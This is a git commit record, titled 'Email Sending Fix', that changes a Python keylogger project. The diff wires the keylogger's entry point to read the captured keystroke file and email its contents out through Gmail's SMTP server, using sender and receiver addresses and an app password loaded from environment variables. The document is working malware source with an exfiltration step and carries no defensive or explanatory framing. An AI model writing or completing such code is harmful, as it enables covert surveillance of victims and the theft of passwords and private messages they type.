fd88c3a7ce900fd5f4cfffb047268f8edfc32bb7
jaisharma001 <vansh.sharma3247@gmail.com>
2025-08-24 00:44:34 +0530

    Email Sending Fix

--- main.py
+++ main.py
@@ -1,10 +1,19 @@
+import os
+from dotenv import load_dotenv
 from logger.keylogger import KeyLogger
+from storage.email_handler import send_email_log
 
+load_dotenv()
 
 def main():
     keylogger = KeyLogger()
     keylogger.start()
-
+    print("\n[*] Keylogger stopped. Sending logs via email.")
+    sender_email = os.getenv("SENDER_EMAIL")
+    password = os.getenv("APP_PASSWORD")
+    receiver_email = os.getenv("RECEIVER_EMAIL")
+    send_email_log(sender_email, password, receiver_email)
+    print("Email sending process completed.")
 
 if __name__ == "__main__":
     main()
--- storage/email_handler.py
+++ storage/email_handler.py
@@ -2,21 +2,17 @@ import smtplib
 from email.mime.text import MIMEText
 
 def send_email_log(sender_email, password, receiver_email, subject="Keylogger Logs", log_file="keylogs.txt"):
-    """Send the keylog file contents via email."""
     try:
         with open(log_file, "r", encoding="utf-8") as f:
             content = f.read()
-
         msg = MIMEText(content)
         msg["Subject"] = subject
         msg["From"] = sender_email
         msg["To"] = receiver_email
-
         with smtplib.SMTP("smtp.gmail.com", 587) as server:
             server.starttls()
             server.login(sender_email, password)
             server.send_message(msg)
-
         print("[*] Log file sent successfully.")
     except Exception as e:
         print(f"[!] Failed to send email: {e}")
